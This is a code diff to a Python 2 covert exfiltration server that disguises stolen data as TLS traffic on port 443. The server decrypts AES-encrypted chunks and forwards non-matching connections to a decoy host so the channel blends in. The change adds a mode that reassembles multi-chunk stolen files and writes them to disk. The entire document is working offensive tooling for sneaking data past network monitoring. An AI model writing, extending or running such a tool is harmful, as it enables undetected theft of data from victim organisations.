@@ -11,7 +11,9 @@ the original private key (which you dont!)
 import os
 import sys
 import struct
+import base64
 import socket
+import random
 import hashlib
 
 from thread import *
@@ -51,12 +53,14 @@ class AESCipher(object):
 
 class HTTPSExfiltrationServer():
 
-    def __init__(self, key, host, duplicate_host="google.com", port=443, max_connections=5, max_size=8192):
+    def __init__(self, key, host, duplicate_host="google.com", port=443, max_connections=5, max_size=8192, file_mode=False):
         self.max_connections = max_connections
         self.max_size = max_size
         self.port = port
         self.host = host
         self.duplicate_host = duplicate_host
+        self.file_mode = file_mode
+
         self.AESDriver = AESCipher(key=key)
 
 
@@ -95,7 +99,20 @@ class HTTPSExfiltrationServer():
                 if data[:3] == "\x17\x03\x03":
                     if data[:6] == "\x17\x03\x03\x16\x05\x16":
                         sys.stdout.write("[.]\tGot data termination indicator.\n")
-                        sys.stdout.write("[.]\tEntire Data stream:\n\t\t'%s'\n" % COMPLETE_DATA)
+
+                        if self.file_mode:
+                            file_name = self.host+str(self.port)+str(random.randint(1000,9999))+".exfil"
+                            try:
+                                f = open(file_name, 'wb')
+                                f.write(COMPLETE_DATA)
+                                f.close()
+                                sys.stdout.write("[+]\tWrote file to '%s'.\n" % file_name)
+                            except IOError, e:
+                                sys.stderr.write("[-]\tThere i was error opening the file to write.\n%s.\n" % e)
+                            except ValueError, e:
+                                sys.stderr.write("[-]\tCan't write because '%s'.\n" % e)
+                        else:
+                            sys.stdout.write("[.]\tEntire Data stream:\n\t\t'%s'\n" % COMPLETE_DATA)
                         COMPLETE_DATA = None
                         try:
                             frwd.close()
@@ -107,21 +124,42 @@ class HTTPSExfiltrationServer():
 
 
                     else:
-                        header = data[:3]
-                        size = struct.unpack(">h", data[3:5])[0]
-                        dec_me = data[5:size + 5]
+                        # This is an incoming file
+                        if self.file_mode:
+                            # Read header data
+                            header = data[:3]
+                            size, counter, total_count = struct.unpack(">hhh", data[3:9])
+                            dec_me = data[9:]
 
-                        sys.stdout.write("[+]\tGot data from socket with length of %s.\n" % size)
+                            sys.stdout.write("[.]\tGetting chunk %s\%s with size %s.\n" % (counter, total_count, size))
 
-                        dec_data = self.AESDriver.decrypt(dec_me)
-
-                        if len(dec_data) is 0:
-                            sys.stdout.write("[-]\tKeys does not match. Unable to decrypt.\n")
-                        else:
-                            if COMPLETE_DATA is None:
-                                COMPLETE_DATA = dec_data
+                            # Decrypt
+                            dec_data = self.AESDriver.decrypt(dec_me)
+                            if len(dec_data) is 0:
+                                sys.stdout.write("[-]\tKeys does not match. Unable to decrypt.\n")
                             else:
-                                COMPLETE_DATA += dec_data
+                                if COMPLETE_DATA is None:
+                                    COMPLETE_DATA = dec_data
+                                else:
+                                    COMPLETE_DATA += dec_data
+
+                        # This is an incoming string
+                        else:
+                            header = data[:3]
+                            size = struct.unpack(">h", data[3:5])[0]
+                            dec_me = data[5:]
+
+                            sys.stdout.write("[+]\tGot data from socket with length of %s.\n" % size)
+
+                            dec_data = self.AESDriver.decrypt(dec_me)
+
+                            if len(dec_data) is 0:
+                                sys.stdout.write("[-]\tKeys does not match. Unable to decrypt.\n")
+                            else:
+                                if COMPLETE_DATA is None:
+                                    COMPLETE_DATA = dec_data
+                                else:
+                                    COMPLETE_DATA += dec_data
 
                 else:
                     try:
@@ -152,5 +190,5 @@ class HTTPSExfiltrationServer():
 
 
 if __name__ == "__main__":
-    server = HTTPSExfiltrationServer(host="127.0.0.1", key="123")
+    server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", duplicate_host="google.com", file_mode=True)
     server.startlistening()
